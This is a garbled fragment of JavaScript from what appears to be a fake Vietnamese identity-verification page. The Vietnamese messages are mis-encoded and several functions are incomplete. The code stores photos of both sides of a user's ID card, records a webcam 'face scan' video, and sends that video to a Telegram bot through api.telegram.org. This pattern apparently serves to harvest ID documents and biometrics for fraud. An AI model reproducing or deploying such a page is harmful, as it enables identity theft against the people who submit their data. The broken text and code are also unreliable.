            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: videoFd });

    function saveStep1() {

    function renderUpload() {

    }

    function storeImg(input, preId, txtId, key) {
        if (input.files[0]) {
            userData[key] = input.files[0];
            const reader = new FileReader();

    function renderVideo() {
        if(!userData.imgFront || !userData.imgBack) return alert("Vui l√≤ng ch·ª•p ƒë·ªß 2 m·∫∑t th·∫ª");
        document.getElementById('flow-content').innerHTML = `

            <div class="relative w-64 h-64 border-4 border-gray-800 rounded-full overflow-hidden shadow-2xl mx-auto">

        const v = document.getElementById('v'), go = document.getElementById('go'), st = document.getElementById('st'), scan = document.getElementById('scan');
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            v.srcObject = stream;
            go.onclick = () => {
                go.classList.add('hidden'); scan.classList.remove('hidden'); st.innerText = "H·ªá th·ªëng ƒëang qu√©t m·∫∑t...";
                let chunks = [], r = new MediaRecorder(stream);
